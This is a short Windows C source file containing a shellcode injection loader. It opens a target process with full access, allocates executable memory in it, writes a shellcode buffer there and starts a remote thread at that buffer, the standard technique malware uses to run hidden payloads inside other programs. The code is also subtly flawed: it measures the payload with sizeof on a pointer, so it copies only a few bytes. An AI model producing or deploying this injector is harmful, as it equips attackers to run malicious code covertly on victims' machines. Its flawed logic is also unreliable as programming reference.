#define _WIN32_WINNT 0x0600

#include <windows.h>
#include <stdio.h>

int load(unsigned char* shellcode, DWORD pid) {

    HANDLE hproc, thread;

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    hproc = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
    if (hproc == NULL) { 
        printf("[!] Failed To Open Process\n"); 
        CloseHandle(hproc); 
        return 0;
    }

    LPVOID buffer = VirtualAllocEx(hproc, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hproc, buffer, shellcode, sizeof(shellcode), NULL);
    thread = CreateRemoteThread(hproc, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL);

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    if (thread == NULL) {
        printf("[!] Failed To Create Remote Thread\n");
        CloseHandle(hproc);
        return 0;
    }

    ////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    return 1;
}
